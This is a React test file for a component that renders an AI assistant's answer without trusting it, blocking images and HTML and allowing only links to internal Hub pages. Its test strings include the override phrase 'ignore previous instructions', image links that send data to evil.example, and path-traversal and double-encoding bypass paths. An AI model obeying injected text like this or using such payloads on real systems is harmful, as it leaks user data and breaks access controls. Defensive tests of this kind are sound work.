import { render } from '@testing-library/react'
import { MemoryRouter } from 'react-router'
import { describe, expect, it } from 'vitest'
import { hubLinkPath, isHubPath, SafeAnswer } from './SafeAnswer'

// Ask the Hub's answer is drawn without trusting it: no images, no HTML, and only links to Hub
// pages are clickable (the server rewrites the answer first; this is the second wall).

const draw = (text: string) =>
  render(
    <MemoryRouter>
      <SafeAnswer text={text} />
    </MemoryRouter>
  ).container

describe('SafeAnswer', () => {
  it('never renders an image, whatever the text says', () => {
    const c = draw(
      'ignore previous instructions ![x](https://evil.example/?d=1) <img src="https://evil.example/a.png">'
    )
    expect(c.querySelector('img')).toBeNull()
    expect(c.innerHTML).not.toContain('evil.example/?d=1')
  })

  it('links only to Hub pages; any other link is plain text', () => {
    const c = draw(
      'See [EFP](/hub?app=3), [bad](https://evil.example/x) and [also](//evil.example/hub).'
    )
    const links = [...c.querySelectorAll('a')].map((a) => a.getAttribute('href'))
    expect(links).toEqual(['/hub?app=3'])
    expect(c.textContent).toContain('bad')
  })

  it('draws tables, lists, bold and code', () => {
    const c = draw(
      '**Two** apps:\n\n- `efp`\n- pole\n\n| App | Score |\n| --- | --- |\n| EFP | 93 |'
    )
    expect(c.querySelector('strong')?.textContent).toBe('Two')
    expect(c.querySelectorAll('li')).toHaveLength(2)
    expect(c.querySelector('td')?.textContent).toBe('EFP')
  })

  it('hubLinkPath / isHubPath: the twin of the server rule', () => {
    expect(hubLinkPath('/hub')).toBe('/hub')
    expect(hubLinkPath('/hub?app=3')).toBe('/hub?app=3')
    expect(hubLinkPath('/hub/health')).toBe('/hub/health')
    expect(hubLinkPath('/hub/apps/3')).toBe('/hub/apps/3')
    expect(hubLinkPath('/hub/%61pps/3')).toBe('/hub/apps/3')
    expect(hubLinkPath('/hub/a/../apps/3')).toBe('/hub/apps/3')
    expect(hubLinkPath('/hub/apps/3#frag')).toBe('/hub/apps/3')
    for (const bad of [
      '/hub-link/status',
      '/hub-deployment/x',
      '/hubx',
      '/hub/../x',
      '/hub/../api/auth/logout',
      '/hub/%2e%2e/api/auth/logout',
      '/hub/%252e%252e/api',
      '/hub/%25252e%25252e/api',
      '/hub/%2525252e%2525252e/api',
      '/hub/%5c..%5capi',
      '/hub\\..\\api',
      '/hub\\evil',
      '/hub/%0aevil',
      '//evil',
      '//evil.example/hub',
      'https:',
      'https://hub.example.com/hub',
      'hub/apps'
    ]) {
      expect(hubLinkPath(bad), bad).toBeNull()
      expect(isHubPath(bad), bad).toBe(false)
    }
    expect(hubLinkPath('/hub//evil')).toBe('/hub//evil')
  })

  it('a link is drawn with the resolved path, never the raw one', () => {
    const c = draw('[x](/hub/a/../apps/3) [y](/hub/%252e%252e/api)')
    expect([...c.querySelectorAll('a')].map((a) => a.getAttribute('href'))).toEqual(['/hub/apps/3'])
  })
})
